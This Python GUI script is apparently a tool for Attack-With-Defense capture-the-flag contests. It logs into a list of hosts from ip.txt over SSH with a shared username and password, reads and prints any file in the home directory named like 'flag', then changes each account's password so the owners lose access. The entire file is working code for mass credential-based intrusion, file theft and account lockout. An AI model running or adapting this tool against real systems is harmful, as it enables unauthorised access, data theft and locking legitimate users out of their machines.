import tkinter as tk
from tkinter import messagebox
import paramiko
import socket

# 全局变量来存储输入框的引用
entry_user = None
entry_old_password = None
entry_new_password = None
entry_port = None
result_label = None  # 用于显示结果的标签

def userssh_changepwd(ip, user, old_password, new_password, port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=ip, port=int(port), username=user, password=old_password, timeout=5)
        stdin, stdout, stderr = ssh.exec_command("ls ~")
        s = str(stdout.read(), 'utf-8')
        for i in s.split('\n'):
            if "flag" in i:
                command1 = "cat ~/%s" % (i.strip())
                stdin, stdout, stderr = ssh.exec_command(command1)
                flag = str(stdout.read(), 'utf-8')
                print("%s-%s" % (ip, flag.strip()))
        
        # 执行 passwd 命令更改密码
        command = "passwd"
        stdin, stdout, stderr = ssh.exec_command(command)
        stdin.write(old_password + '\n' + new_password + '\n' + new_password + '\n')
        stdout.channel.recv_exit_status()  # 等待命令执行完成
        error_output = str(stderr.read(), 'utf-8')
        if "password updated successfully" in error_output:
            print(ip + " 密码修改成功！")
            ssh.close()
            return True
        else:
            print('\033[31m错误：\033[0m' + error_output)
            print(ip + " 密码修改失败！")
            ssh.close()
            return False
    except paramiko.ssh_exception.AuthenticationException as e:
        print(ip + ' ' + '\033[31m账号密码错误!\033[0m')
        with open('nossh.txt', 'a') as f:
            f.write(ip + '\n')
        return False
    except socket.timeout as e:
        print(ip + ' ' + '\033[31m连接超时！\033[0m')
        with open('timeoutssh', 'a') as f:
            f.write(ip + '\n')
        return False

def load_and_change_passwords():
    ips = []
    try:
        with open('ip.txt', 'r') as f:
            ips = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        messagebox.showerror("错误", "未找到ip.txt文件")
        return

    success_count = 0
    fail_count = 0
    for ip in ips:
        user = entry_user.get()
        old_password = entry_old_password.get()
        new_password = entry_new_password.get()
        port = entry_port.get()

        try:
            result = userssh_changepwd(ip, user, old_password, new_password, port)
            if result:
                success_count += 1
            else:
                fail_count += 1
        except Exception as e:
            print(e)
    
    total = success_count + fail_count
    result_label.config(text=f"批量密码修改完成！成功：{success_count}，失败：{fail_count}，总共：{total}")

def create_entry(label_text, default_value, show=None):
    global entry_user, entry_old_password, entry_new_password, entry_port
    frame = tk.Frame(root)
    label = tk.Label(frame, text=label_text)
    label.pack(side=tk.LEFT)
    entry = tk.Entry(frame, width=50, show=show)
    entry.insert(0, default_value)
    entry.pack(side=tk.RIGHT)
    frame.pack()
    
    # 根据标签文本将Entry对象赋值给全局变量
    if label_text == "用户名:":
        entry_user = entry
    elif label_text == "旧密码:":
        entry_old_password = entry
    elif label_text == "新密码:":
        entry_new_password = entry
    elif label_text == "端口:":
        entry_port = entry

root = tk.Tk()
root.title("Awd-批量ssh密码修改器GUI   V0.1")

create_entry("用户名:", "")
create_entry("旧密码:", "", show="*")
create_entry("新密码:", "", show="*")
create_entry("端口:", "")

button_load_ips = tk.Button(root, text="开始修改", command=lambda: load_and_change_passwords())
button_load_ips.pack()

# 创建一个标签用于显示结果
result_label = tk.Label(root, text="", fg="blue")
result_label.pack()

root.mainloop()